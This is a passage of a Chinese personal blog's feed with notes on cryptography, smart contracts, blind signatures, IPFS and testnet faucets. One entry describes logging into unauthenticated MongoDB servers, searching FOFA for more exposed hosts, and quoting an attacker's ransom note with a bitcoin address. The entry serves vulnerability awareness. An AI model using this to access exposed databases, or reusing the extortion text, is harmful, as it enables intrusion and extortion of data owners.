class="headerlink" title="2.3 应用场景"></a>2.3 应用场景</h3><h3 id="2-4-DH密钥交换协议存在的漏洞"><a href="#2-4-DH密钥交换协议存在的漏洞" class="headerlink" title="2.4 DH密钥交换协议存在的漏洞"></a>2.4 DH密钥交换协议存在的漏洞</h3><p>然而，没有相互身份认证的DH密钥交换协议可能会遭受<strong>中间人攻击、模拟攻击和重播攻击</strong><br>于是在这个基础之上就衍生出了AKE。认证密钥交换协议，交换密钥的双方必须提前获得身份认证才能进行密钥交换。</p><p>这个认证是如何完成的？<br>如CA 第三方认证机构颁发数字证书Certificate，证明Alice是Alice，Bob是Bob。<br>如何去除CA，是去中心化需要解决的问题，实现DAKE。</p><h3 id="2-5-安全属性-待完善"><a href="#2-5-安全属性-待完善" class="headerlink" title="2.5 安全属性(待完善)"></a>2.5 安全属性(待完善)</h3><p>中间人攻击、模拟攻击和重播攻击</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://blog.csdn.net/weixin_43255133/article/details/84757675?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165365604016780357292666%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165365604016780357292666&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-2-84757675-null-null.nonecase&utm_term=%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4450">一文彻底搞懂加密、数字签名和数字证书，看不懂你打我！</a></p><p><a href="https://blog.csdn.net/TheSkyLee/article/details/108699243?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165365046016782425117461%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165365046016782425117461&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-108699243-null-null.142%5Ev11%5Econtrol,157%5Ev12%5Econtrol&utm_term=%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D&spm=1018.2226.3001.4187">Diffie-Hellman密钥交换协议</a></p><p><a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">维基百科Diffie–Hellman key exchange</a></p><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>Key Exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链智能合约||Web3的投币机</title>
    <link href="/2022/05/24/SmartContract/"/>
    <url>/2022/05/24/SmartContract/</url>
    
    <content type="html"><![CDATA[<p>这篇文章主要整理了我的一些疑惑和解答，仅供参考，本人还在学习。</p><h2 id="0x01-什么是智能合约？"><a href="#0x01-什么是智能合约？" class="headerlink" title="0x01 什么是智能合约？"></a>0x01 什么是智能合约？</h2><p>以太坊的智能合约并非现实中常见的合同，而是存在区块链上，可以被触发执行的一段<strong>程序代码</strong>，这些代码实现了某种预定的规则，是存在于以太坊执行环境中的“自治代理”。</p><h2 id="0x02-没有智能合约之前是如何运作的？"><a href="#0x02-没有智能合约之前是如何运作的？" class="headerlink" title="0x02 没有智能合约之前是如何运作的？"></a>0x02 没有智能合约之前是如何运作的？</h2><p>我们知道区块链简单可以分为三个发展阶段。</p><ol><li><p>Blockchain 1.0<br>加密货币概念开始：第一代技术始于2009年的比特币网络，它被称为区块链1.0。在这一代中，引入了第一个加密货币的创造。<br>这一阶段的想法都是关于<strong>支付及生成加密货币</strong>的功能。</p></li><li><p>Blockchain 2.0<br>智能合约的出现：在区块链技术的第二阶段，2010年引入了各种应用的智能合约和金融服务。<strong>以太坊和超级账本</strong>在这一代中出现。</p></li><li><p>Blockchain 3.0</p></li></ol><p><strong>去中心化应用程序Dapp</strong>的兴起：在这一代区块链中，引入了对分散应用的收敛性。各种研究领域，如卫生、监管、物联网、供应链、商业和智能计算机被考虑用来构建去中心化的应用程序。<br>在这个级别上，使用了以太坊、超级账本和其他一些能够为各种应用程序编写智能合约的平台</p><p>由此我们得知，<strong>没有智能合约之前，区块链技术只能实现很简单的交易等，并不能实现去中心化服务</strong>。</p><h2 id="0x03-智能合约是如何发布和运行的？有什么用"><a href="#0x03-智能合约是如何发布和运行的？有什么用" class="headerlink" title="0x03 智能合约是如何发布和运行的？有什么用?"></a>0x03 智能合约是如何发布和运行的？有什么用?</h2><h3 id="3-1-智能合约的创建："><a href="#3-1-智能合约的创建：" class="headerlink" title="3.1 智能合约的创建："></a>3.1 智能合约的创建：</h3><p>外部账户发起一个转账交易到0x0地址，合约的代码在data域里。<br><img src="/img/contract_new.png"></p><h3 id="3-2-智能合约的部署："><a href="#3-2-智能合约的部署：" class="headerlink" title="3.2 智能合约的部署："></a>3.2 智能合约的部署：</h3><p>主要流程包括以下4个步骤：<br>（1）启动一个以太坊节点/在本地安装hardhat、truffle等平台，他们是solidity编译器；<br>（2）编写智能合约；<br>（3）编写后的智能合约经以太坊虚拟机的编译，成为计算机可运行的字节码；<br>（4）外部账户（合约发起者）发起一个转账交易到0x0地址，编译好的字节码文件在data域里。最终，通过发起交易的形式广播到区块链网络中，由矿工挖矿确认后即可将智能合约存入区块链中，并得到智能合约所在地址及调用合约所需接口。<br>以上就是智能合约的部署方式。</p><p><strong>tips:</strong><br>(1)不是必须的，不一定非要有一个节点 普通用户编写完智能合约之后，在hardhat或者remix等平台本地编译，发送一个新建智能合约的交易到网关节点，由网关节点发送交易到0x0地址，并以广播形式… 重复以上。<br>data域是交易的其中一个内容。</p><h3 id="3-3-智能合约的执行："><a href="#3-3-智能合约的执行：" class="headerlink" title="3.3 智能合约的执行："></a>3.3 智能合约的执行：</h3><p>智能合约可以被外部调用，也可以被另一个合约调用。<br>外部即外部账户，普通用户想要调用智能合约的某个功能,他会</p><pre><code class="hljs">(1) 首先 ，发起一个智能合约交易，data中存储调用的函数。相应的有Gas消耗(2) 交易发送到比如网关节点 infura之类的infura节点对该交易进行验证，加入自己的交易池中，并向其他节点广播该交易(3) 其他节点收到交易之后,也进行验证,并加入交易池,广播给其他节点重复以上直到该交易广播到全网 （这个过程时间多少？）(4) 矿工节点除了有广播和验证的功能之外，还有打包区块的功能。最终，该交易会被一个矿工节点打包到区块上，添加到区块链上。(5) 新的区块不断广播，节点验证每个区块，加入到自己本地存储的区块链，也就是账本上。注意：每个节点都会执行新产生的区块中的智能合约操作，在EVM中执行。</code></pre><p>tips:<br>Infura是一个托管的以太坊节点集群，可以将你开发的以太坊智能合约部署到infura提供的节点上，而无需搭建自己的以太坊节点。通过api调用，可以执行交易，合约交易产生的结果输出到程序中。</p><h2 id="0x04-EVM的作用"><a href="#0x04-EVM的作用" class="headerlink" title="0x04 EVM的作用"></a>0x04 EVM的作用</h2><p>以太坊虚拟机是在沙盒中运行，这是和区块链主链完全隔离的，并且完美地作为测试环境运行。因此，任何想要使用EVM创建智能合约的人，都可以在不受到其他区块链操作的影响下完成。</p><p>注意EVM和节点主机是隔离的，所以智能合约的运行和运行节点客户端的主机之间无关。<br>个人理解：主机运行客户端，所以成为节点。客户端中有EVM和区块链等。<br>至于节点客户端和主机之间有什么交互，我们后续再解答，笔者还未了解详细。</p><h2 id="0x05-以太坊的交易"><a href="#0x05-以太坊的交易" class="headerlink" title="0x05 以太坊的交易"></a>0x05 以太坊的交易</h2><h3 id="5-1-交易的执行"><a href="#5-1-交易的执行" class="headerlink" title="5.1 交易的执行"></a>5.1 交易的执行</h3><p><strong>以太坊一个普通交易是如何执行的？</strong></p><ol><li>用户从Dapp或者钱包初始化一笔交易，比如发送资金或者调用合约。这个类似弹出了MetaMask交易界面。</li><li>用户使用它们的钱包（私钥）签名这个交易。这个例如我们在第一步弹出的交易界面点击确定按钮（签名交易）。</li><li>钱包将签名后的交易发送到连接到以太坊网络的一个节点，通常叫着网关节点。比如我们常用的Infura节点。</li><li>网关节点验证该交易有效并将它放入自己的内存池（交易池/交易队列）中。此时，该交易为Pending状态，所有人都可以读取（前提是提供该项服务）。具体的对象名称在Geth和Parity客户并不相同。进入pending状态的交易代表着将要被交易，具体交易区块由打包矿工决定。</li><li>网关节点将该交易向其它节点（邻近节点）扩散（广播）。这是个Pending交易传播过程。<br>它节点接收到该交易后也验证有效性，然后放入自己的内存池中。然后再向其它节点扩散。这是其它节点将pending放入自己的内存池中。</li><li>重复上述步骤，直到该交易扩散到整个网络。<br>矿工是一种特殊节点，它们除了接收交易和验证它以外，还试图把它加入一个区块。矿工特权，具有打包交易的权利。</li><li>最终，会有一个矿工将该交易打包到区块中（这里假定交易成功并且会被打包）并添加到区块链上（产生一个新区块）。这就是通常所说的挖矿（出块）。<br>新产生的区块向全网广播。（以太坊大概13秒左右出一个块，基本上能够全网广播）。</li><li>所有节点接收到该区块，查看其中包含的交易并将其从自己的内存池中移除。</li></ol><p>当然，这里是有前提的，假定该交易一定被打包，实际上，交易有可能不会被打包，还有可能会被挤出内存池，因为矿工遵循利益最大化原则，谁出的价格高（gasPrice)，先给谁打包，这个原则也催生了跟随交易和抢先交易。</p><h3 id="5-2-交易的种类"><a href="#5-2-交易的种类" class="headerlink" title="5.2 交易的种类"></a>5.2 交易的种类</h3><p><strong>以太坊区块链可以托管三种类型的交易：</strong></p><ol><li><p>首先，你可以将以太坊从一个账户转移到另一个账户。这些转账和比特币转账差不多。例如，你可以转3ETH到房东的账户，作为房租。这些转账记录会包含以下内容：转账生效时的时间戳，转出资金者的地址作为资金的来源，接受者的地址，当然还有资金的数额。</p></li><li><p>用户还可以不给特定对象转账。这类转账就是创建智能合约。例如，假如Jackson和James很聪明，他们打算为特定赌注的条件创建智能合约。这种转账就会包含转出者的账户地址以及时间戳。</p></li><li><p>从外部账户转账到智能合约。每次账户想要执行智能合约，转账就会根据智能合约完成，而且相关的执行规则会记录在数据中，来指导这个合约如何运行。<br>每次上述的转账发生，网络中的节点就会通过EVM来运行特定的代码。</p></li></ol><p><strong>以下内容我并未整理清楚，等待我后续补全！</strong></p><ol><li>智能合约的调用和交易流程</li><li>智能合约有什么新的发展方向</li><li>Solidity 智能合约审计</li><li>其他关于以太坊的知识</li></ol><h2 id="0x06-一些有用的课程和笔记"><a href="#0x06-一些有用的课程和笔记" class="headerlink" title="0x06 一些有用的课程和笔记"></a>0x06 一些有用的课程和笔记</h2><h2 id="0x07-参考链接："><a href="#0x07-参考链接：" class="headerlink" title="0x07 参考链接："></a>0x07 参考链接：</h2><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg"><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/Mu_Xiaoye/article/details/104299664?spm=1001.2014.3001.5506">https://blog.csdn.net/Mu_Xiaoye/article/details/104299664?spm=1001.2014.3001.5506</a><br><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/XYlittlework/article/details/118026479">https://blog.csdn.net/XYlittlework/article/details/118026479</a><br><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.bilibili.com/video/BV1Vt411X7JF?p=22">https://www.bilibili.com/video/BV1Vt411X7JF?p=22</a><br><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.jb51.net/blockchain/768106.html">https://www.jb51.net/blockchain/768106.html</a><br><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://blog.csdn.net/weixin_39430411/article/details/118197937">https://blog.csdn.net/weixin_39430411/article/details/118197937</a><br><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://blog.csdn.net/Mu_Xiaoye/article/details/104299664?spm=1001.2014.3001.5506">https://blog.csdn.net/Mu_Xiaoye/article/details/104299664?spm=1001.2014.3001.5506</a><br><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://www.bilibili.com/video/BV1Vt411X7JF?p=22">https://www.bilibili.com/video/BV1Vt411X7JF?p=22</a><br><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链</tag>
      
      <tag>智能合约</tag>
      
      <tag>以太坊</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数字签名知多少？| 一篇总结与分类</title>
    <link href="/2022/05/23/SignatureSchema/"/>
    <url>/2022/05/23/SignatureSchema/</url>
    
    <content type="html"><![CDATA[<p>首先你必须知道什么是加密，什么是签名。<br>加密是对一段明文做分组，混淆等操作之后，即使变成密文，经过密钥解密也能恢复的数学操作。<br>签名是对消息的哈希用私钥进行签名，并用公钥进行验证的一种操作。<br>而哈希是一种压缩的操作，对消息已经有了一定损失，无法恢复。</p><h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><p>签名是对消息的哈希用私钥进行签名，并用公钥进行验证的一种操作。用于消息的身份验证，避免冒充和伪造。<br>一个数字签名的简单流程如下:<br><img src="/img/DS_flow.jpg"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>介绍其各自使用的加密算法，数学知识等</p><h3 id="盲签名-匿名性"><a href="#盲签名-匿名性" class="headerlink" title="盲签名 匿名性"></a>盲签名 匿名性</h3><h3 id="DSA-数字签名"><a href="#DSA-数字签名" class="headerlink" title="DSA 数字签名"></a>DSA 数字签名</h3><h3 id="Schnorr-signature"><a href="#Schnorr-signature" class="headerlink" title="Schnorr signature"></a>Schnorr signature</h3><h3 id="ElGamal-signature"><a href="#ElGamal-signature" class="headerlink" title="ElGamal signature"></a>ElGamal signature</h3><h3 id="环签名-匿名"><a href="#环签名-匿名" class="headerlink" title="环签名 匿名"></a>环签名 匿名</h3><h3 id="多方签名"><a href="#多方签名" class="headerlink" title="多方签名"></a>多方签名</h3><p>多方见证 但是速度慢</p><h3 id="群签名"><a href="#群签名" class="headerlink" title="群签名"></a>群签名</h3><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg">s</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字签名</tag>
      
      <tag>区块链</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BlindSignature | 先生您好，这份文件是你签的吗？</title>
    <link href="/2022/05/23/BlindSignature%E7%9B%B2%E7%AD%BE%E5%90%8D/"/>
    <url>/2022/05/23/BlindSignature%E7%9B%B2%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>-假设一种场景，对某文件签名，而不让签名者看到文件内容，怎么做呢？</p><p>-有同学会说：我知道！让签名者把眼睛闭起来。是的，这也其实是一种办法。<br> 当然更优化的方案是：把文件放到信封里，在信封里放一张复写纸，签名者在信封上签名时，<br> 他的签名便透过复写纸签到文件上。</p><p>此时实现了让签名者不知道内容的同时，实现了数字签名，保护了文件的内容安全。<br>这里只是做一个简单的类比，实际情况中，信封就是消息的盲化操作。<br>（没耐心的人请直接阅读0x04 本文搬运自@Weisswire 大佬的博客 <a href="https://www.cnblogs.com/Severus-Cavendish/p/15587538.html">https://www.cnblogs.com/Severus-Cavendish/p/15587538.html</a>)</p><h1 id="0x01-盲签名的定义"><a href="#0x01-盲签名的定义" class="headerlink" title="0x01 盲签名的定义"></a>0x01 盲签名的定义</h1><p>是一种数字签名的方式，在消息内容被签名之前，对于签名者来说消息内容是不可见的，也就是盲化。</p><h1 id="0x02-性质"><a href="#0x02-性质" class="headerlink" title="0x02 性质"></a>0x02 性质</h1><pre><code class="hljs">不可伪造性：除了签名者本人外，任何人都不能以他的名义生成有效的盲签名。这是一条最基本的性质。不可抵赖性：签名者一旦签署了某个消息，他无法否认自己对消息的签名。盲性：签名者虽然对某个消息进行了签名，但他不可能得到消息的具体内容。不可跟踪性：一旦消息的签名公开后，签名者不能确定自己何时签署的这条消息。即签名者仅知sig(m&#39;)，而不知sig(m）。即使签名者保留sig(m&#39;)及其他有关数据，仍难以找出sig(m)和、sig(m&#39;)之间的内在联系，不可对消息m的拥有者进行追踪</code></pre><h1 id="0x03-流程"><a href="#0x03-流程" class="headerlink" title="0x03 流程"></a>0x03 流程</h1><ol><li>接收者首先将待签数据进行盲变换，把变换后的盲数据发给签名者。</li><li>经签名者签名后再发给接收者。</li><li>接收者对签名再作去盲变换，得出的便是签名者对原数据的盲签名。</li></ol><p><img src="/img/blindvsnormal.png"></p><h1 id="0x04-具体步骤"><a href="#0x04-具体步骤" class="headerlink" title="0x04 具体步骤"></a>0x04 具体步骤</h1><p>1.消息盲化。甲将原消息m进行盲化处理得m’，然后将盲消息m’传送给乙。进行盲化处理的方法很多，例如，可随机选取某个数，称该随机数为盲因子，把原消息数值化后，与盲因子相乘即可得到盲消息。</p><p>2.对盲消息签名。乙应用通常的数字签名方法对盲消息进行签名，并将其签名sig(m’)送给甲。</p><p>3.恢复签名。甲通过除去盲因子的方法，从盲签名sig(m’)中得到相关原消息m的签名：sig(m)。将来出现纠纷时，当甲拿出乙的盲签名，而乙显然不能否认其签名，这样就可以证明原消息的真实性。</p><p>传统的方案主要是RSA方案，区块链中多数时候会用到椭圆曲线进行签名。</p><h1 id="0x05-应用场景"><a href="#0x05-应用场景" class="headerlink" title="0x05 应用场景"></a>0x05 应用场景</h1><p>一切需要匿名签名的情况，比如</p><ol><li>匿名投票</li><li>电子现金：一般的签名，签名者对自己发出的签名，必须是记得的，比如，在何时何地对谁发的，他自己可以记下来。<br>但是，如果把签名看作是电子现金的话，就涉及到一个匿名性的问题。<br>我们也不希望银行通过追踪自己发出签名，来获得用户的消费情况，于是就设计出盲签名。</li></ol><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字签名</tag>
      
      <tag>区块链</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学笔记|给密码学初学者的启示（一）</title>
    <link href="/2022/05/18/CrytoSchema/"/>
    <url>/2022/05/18/CrytoSchema/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学方案概述"><a href="#密码学方案概述" class="headerlink" title="密码学方案概述"></a>密码学方案概述</h1><h2 id="0x01-密码学分类"><a href="#0x01-密码学分类" class="headerlink" title="0x01 密码学分类"></a>0x01 密码学分类</h2><p>对称密码学<br>非对称密码学<br>RSA DES AES 椭圆曲线 Elgama<br>ABE 是什么 如何实现的 可以怎么利用和优化于方案中<br>基于什么的加解密</p><h2 id="0x02-基于身份加密-可否认加密-配对加密"><a href="#0x02-基于身份加密-可否认加密-配对加密" class="headerlink" title="0x02 基于身份加密 可否认加密 配对加密"></a>0x02 基于身份加密 可否认加密 配对加密</h2><p>在基于身份加密出现之前的解决方案是？</p><h2 id="0x03-常见的hash算法"><a href="#0x03-常见的hash算法" class="headerlink" title="0x03 常见的hash算法"></a>0x03 常见的hash算法</h2><p>MD5<br>sha1<br>sha256<br>什么是哈希碰撞<br>哈希算法的应用场景<br>为什么要用哈希而不是其他算法  他的优缺点是什么？</p><p>关于哈希算法的疑惑</p><p>1.单向性的意思是：一个固定的输入会得到一个固定的输出吗？<br>2.如果一个固定的输入会得到固定的输出 那这有什么不可破解的难度存在 我只需要找摘要对应的是哪个明文不就行了吗<br>3.或许一个hash值对应着许多个不同的明文？</p><h2 id="0x04-常见的密码学攻击方式"><a href="#0x04-常见的密码学攻击方式" class="headerlink" title="0x04 常见的密码学攻击方式"></a>0x04 常见的密码学攻击方式</h2><p>频率攻击</p><h1 id="0x05-密码学应用"><a href="#0x05-密码学应用" class="headerlink" title="0x05 密码学应用"></a>0x05 密码学应用</h1><p>数字签名？原理是什么？怎么用 盲签名 环签名 群签名 多签名<br>什么是布隆过滤器？</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>密码学攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPFS？数据永存！</title>
    <link href="/2022/05/16/IPFS_1.0/"/>
    <url>/2022/05/16/IPFS_1.0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-什么是IPFS"><a href="#0x01-什么是IPFS" class="headerlink" title="0x01 什么是IPFS"></a>0x01 什么是IPFS</h1><h1 id="0x02-IPFS-文件的上传和下载"><a href="#0x02-IPFS-文件的上传和下载" class="headerlink" title="0x02 IPFS 文件的上传和下载"></a>0x02 IPFS 文件的上传和下载</h1><h1 id="0x03-IPFS-网关"><a href="#0x03-IPFS-网关" class="headerlink" title="0x03 IPFS 网关"></a>0x03 IPFS 网关</h1><h1 id="0x04-如何搭建自己的ipfs服务"><a href="#0x04-如何搭建自己的ipfs服务" class="headerlink" title="0x04 如何搭建自己的ipfs服务"></a>0x04 如何搭建自己的ipfs服务</h1><p>多种方式，如Desktop 通过<a href="http://127.0.0.1:8080/ipfs/hash">http://127.0.0.1:8080/ipfs/hash</a> 访问文件 有一些是https:// 访问</p><h1 id="0x05-有趣的发现"><a href="#0x05-有趣的发现" class="headerlink" title="0x05 有趣的发现"></a>0x05 有趣的发现</h1><p>发现去一些公开的IPFS网关 也可以通过hash值访问到特定文件，而且即使你本地的文件删除了<br>该文件仍然会在其他节点上存在着副本，隔段时间再消失（应该是）<br>这就颇有  数据永存  的味道了<br>这样，一个只要能联网，就可以访问某文件的神奇的世界就实现了（bushi</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式文件系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链开发|给区块链初学者的实验启示（一）</title>
    <link href="/2022/05/16/how2builddev4bc/"/>
    <url>/2022/05/16/how2builddev4bc/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>现存：<br>Goerli<br><a href="https://goerli-faucet.pk910.de/">https://goerli-faucet.pk910.de/</a></p><p>水龙头整理链接<br><a href="https://faucetlink.to/">https://faucetlink.to/</a></p><h1 id="0x01-区块链介绍"><a href="#0x01-区块链介绍" class="headerlink" title="0x01 区块链介绍"></a>0x01 区块链介绍</h1><p>区块链与其他技术的区别<br>点对点网络 分布式网络 分布式文件系统 IPFS<br>区块链种类<br>比特币网络 和 以太坊网络 的区别是什么？<br>测试网络的存在</p><p>Fork 是什么？<br>最长链原则<br>挖矿是如何进行的<br>一些常见的区块链漏洞</p><p>共识算法<br>原理的核心<br>什么是账户<br>账户是如何产生的 占不占空间<br>什么是地址<br>什么是账本 Ledger<br>什么是交易 Transtraction TX<br>一次交易必须是一对一的吗 还是可以多对多？ 一个人给多个人转账？<br>区块链的数据是不断增长的 为什么不会有数据爆炸？<br>区块链上的区块存储的到底是什么？</p><p>一个地址可能是账户 可能是智能合约 查看某账户的交易记录<br>如何知道一个地址是合约还是账户<br>公私钥的作用</p><p>一个账户消亡之后 私钥会回收吗<br>地址呢？</p><p>什么是智能合约<br>数字签名<br>Merkle Tree<br>以太坊区块是如何打包的？区块里面是什么？<br>多条链是如何处理的？<br>DPOS 的几条准则和会遇到的情况？</p><h1 id="0x02-实验平台"><a href="#0x02-实验平台" class="headerlink" title="0x02 实验平台"></a>0x02 实验平台</h1><p>Ganache Geth？ 什么关系<br>Geth Go-ethereum 以太坊客户端GO语言编写 主网络<br>Ganache GUI 以太坊私链 本地环境<br>Truffle Hardhat 以太坊开发框架 集成了一些库<br>Remix IDE solc solidity IDE<br>js web3.js ethers.js javascript的web3库<br>python web3.py<br>rpc节点 API<br>infura alchemy 提供测试网络和主网络的xx？ API json rpc</p><p>json-rpc<br>json<br>rpc<br>API<br>client<br>全节点 轻节点</p><p>如何搭建私链？<br>什么是钱包？MetaMask<br>Solidity</p><h1 id="0x03-Web-3-0"><a href="#0x03-Web-3-0" class="headerlink" title="0x03 Web 3.0"></a>0x03 Web 3.0</h1><h1 id="0x04-测试网络以及测试币水龙头"><a href="#0x04-测试网络以及测试币水龙头" class="headerlink" title="0x04 测试网络以及测试币水龙头"></a>0x04 测试网络以及测试币水龙头</h1><p>如何得到测试币<br>网站：<br>已关闭：<br>Rinkeby testnet<br><a href="https://faucets.chain.link/rinkeby">https://faucets.chain.link/rinkeby</a> 拿0.1ETH<br><a href="https://rinkebyfaucet.com/">https://rinkebyfaucet.com/</a> 拿0.5ETH<br>Ropsten testnet<br><a href="https://faucet.dimensions.network/">https://faucet.dimensions.network/</a> 拿1ETH<br><a href="https://faucet.egorfine.com/">https://faucet.egorfine.com/</a> 拿10ETH<br><a href="https://moonborrow.com/">https://moonborrow.com/</a> 拿一定数量的币</p><p>现存：<br>Goerli<br><a href="https://goerli-faucet.pk910.de/">https://goerli-faucet.pk910.de/</a></p><p>水龙头整理链接<br><a href="https://faucetlink.to/">https://faucetlink.to/</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>区块链实验</tag>
      
      <tag>Ethereum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>粗心程序员惨遭删库勒索</title>
    <link href="/2022/05/15/monogodbvuls/"/>
    <url>/2022/05/15/monogodbvuls/</url>
    
    <content type="html"><![CDATA[<div class="note note-warning">            <p>申明：本地测试为授权操作，请遵守法律，切勿对网站进行未授权的恶意攻击渗透</p>          </div><h1 id="MongoDB遭遇删库勒索漏洞"><a href="#MongoDB遭遇删库勒索漏洞" class="headerlink" title="MongoDB遭遇删库勒索漏洞"></a>MongoDB遭遇删库勒索漏洞</h1><h2 id="0X01-漏洞介绍"><a href="#0X01-漏洞介绍" class="headerlink" title="0X01 漏洞介绍"></a>0X01 漏洞介绍</h2><p>最近在看的项目源代码用到很多类型的数据库，除了上次我们讲到redis数据库<br>这次我又发现，除了已知的redis之外，MongoDB数据库也可能存在未授权登录<br><img src="/img/mongo.png"></p><p>这里我们对MongoDB不做特别介绍，只需要知道该漏洞，和上次的redis漏洞一样初始化运行时候，默认都是没有密码的<br>且没有严格的访问控制，容易造成任意用户登录等问题</p><h2 id="0X02-漏洞利用"><a href="#0X02-漏洞利用" class="headerlink" title="0X02 漏洞利用"></a>0X02 漏洞利用</h2><p>信息搜集一番，安装MongoDB Compass，根据ip和端口号尝试连接<br><img src="/img/mongo_connect.png"><br>通过输入ip:port连接成功!<br><img src="/img/mongo_login.png"></p><p>查看数据库 Database，发现有三个admin，config和一个显著的Readme to recover your data<br><img src="/img/mondb_cont.png"></p><p>查看ReadMe和其他数据库，发现该数据库已经被dump了<br>且攻击者留下信息，要求48h内汇款比特币交易，才会将数据还给你</p><pre><code class="hljs">All your data is a backed up. You must pay 0.03 BTC to 1322TfVUsgwNkWupVwEdceyRYbEZeN9qCu 48 hours for recover it.After 48 hours expiration we will leaked and exposed all your data. In case of refusal to pay, we will contact the General Data Protection Regulation, GDPR and notify them that youstore user data in an open form and is not safe. Under the rules of the law, you face a heavy fine or arrest andyour base dump will be dropped from our server! You can buy bitcoin here, does not take much time to buy https://localbitcoins.com or https://buy.moonpay.io/ After paying write to me in the mail with your DB IP: recmydb+1vqt9@onionmail.org and you will receive a link to download your database dump.</code></pre><p>到目前为止，我们已经展示了两个数据库相关的利用手段特别傻瓜的漏洞，均为未授权访问类型的漏洞<br>即通过远程连接无密码登录服务器数据库，并可以对数据库进行若干操作</p><p>灵机一动，我们去fofa(网络空间扫描)看看其他机器是否有类似的漏洞<br><img src="/img/fofa_mongo.png"><br>果不其然，很多ip都存在，且相当一部分机器已经被删库，并留下勒索信息<br><img src="/img/fofa_mongobug.png"></p><h2 id="0X03-可能造成的影响："><a href="#0X03-可能造成的影响：" class="headerlink" title="0X03 可能造成的影响："></a>0X03 可能造成的影响：</h2><p>首先数据库内容若非敏感信息，损失不严重<br>但我们发现任意登陆者都可以任意上传文件，推测可以造成服务器内存异常<br>这样就会使得原本正常运行在该服务器上的服务无法很好地运行</p><h2 id="0X04-可能造成的影响："><a href="#0X04-可能造成的影响：" class="headerlink" title="0X04 可能造成的影响："></a>0X04 可能造成的影响：</h2><p>若不需要mongodb可以将其卸载 然后设置好权限 去掉外网访问权限<br>其他修复意见见网络</p><h2 id="0X05-相关博客"><a href="#0X05-相关博客" class="headerlink" title="0X05 相关博客"></a>0X05 相关博客</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.cnblogs.com/lzkalislw/p/15991123.html">https://www.cnblogs.com/lzkalislw/p/15991123.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Database</tag>
      
      <tag>MongoDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>门罗币挖矿漏洞</title>
    <link href="/2022/04/23/Vulnerability/"/>
    <url>/2022/04/23/Vulnerability/</url>
    
